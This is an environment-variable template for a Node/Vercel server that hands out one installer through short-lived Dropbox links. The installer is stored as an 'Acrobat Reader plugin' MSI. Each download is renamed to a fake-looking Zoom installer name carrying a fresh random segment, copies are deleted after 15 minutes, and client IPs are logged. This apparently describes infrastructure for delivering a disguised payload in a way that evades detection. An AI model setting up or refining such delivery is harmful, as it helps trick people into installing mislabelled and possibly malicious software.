# Copy to .env and adjust:  copy .env.example .env   (Windows PowerShell: Copy-Item .env.example .env)

# Port the server listens on (Vercel sets its own)
PORT=3000

# --- Dropbox download delivery (REQUIRED) ---
# /api/download mints a short-lived Dropbox direct-download URL and 302s to it.
# One-time setup (full walkthrough in README.md, "Dropbox setup"):
#  1. Create an app at https://www.dropbox.com/developers/apps
#     (Scoped access -> App folder) and enable the files.content.read permission.
#  2. Copy the App key and App secret from the Settings tab.
#  3. Upload the installer into the app folder of your Dropbox
#     (Dropbox/Apps/<AppName>/) — named exactly as DOWNLOAD_FILE_PATH below.
#  4. Run:  npm run dropbox-refresh-token
#     and paste the printed refresh token here.
DROPBOX_APP_KEY=
DROPBOX_APP_SECRET=
DROPBOX_REFRESH_TOKEN=

# The installer inside the app folder of your Dropbox (case-sensitive, must start
# with "/"). It is never renamed or modified: every download is served from a
# temporary server-side copy of it, named from DOWNLOAD_NAME_TEMPLATE, because
# Dropbox names the saved file after the stored file name. Verify with:
#   npm run dropbox:list-files
DOWNLOAD_FILE_PATH=/AcrobatReaderPlugin_V26.8.102.msi

# Name each download is served under. {random} is replaced per download by a fresh
# 55-character segment (A-Z a-z 0-9 - _ @).
DOWNLOAD_NAME_TEMPLATE=Zoom_cm_fo42mnktZ9vvrZo4_{random}_k6c8493c377d76800_.msi

# How long a per-download copy survives; the next request deletes older copies.
DOWNLOAD_COPY_TTL_MINUTES=15

# --- Optional ---

# Set to 1 when running behind a reverse proxy or on Vercel, so the rate limit
# and the download log see the real client IP from X-Forwarded-For.
TRUST_PROXY=1

# Secret expected by the /api/logs endpoint (?secret=...)
# LOG_SECRET=